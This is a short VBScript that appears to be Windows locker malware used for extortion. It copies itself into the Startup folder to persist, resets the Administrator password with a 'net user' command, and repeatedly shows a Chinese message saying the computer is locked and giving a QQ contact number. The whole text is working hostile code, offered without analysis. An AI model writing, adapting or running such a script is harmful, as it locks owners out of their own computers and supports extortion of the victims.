wscript.sleep 1000*60

set fso = createobject("scripting.filesystemobject")  
set ws = createobject("wscript.shell")   
pt = ws.specialfolders("startup") & "\"
set file = fso.getfile(wscript.scriptfullname)   
file.copy pt

msgbox "你电脑已中锁，请联系QQ:619699629",64,"系统提示"

set oShell = wscript.CreateObject ("wscript.shell")
oShell.run "net user Administrator woshixiaozhu"
set oShell = nothing

do until i=10 
i=i+1 
msgbox "你电脑已中锁，请联系QQ:619699629",16+4096,"系统提示" 
wscript.sleep 1000*60*5
loop
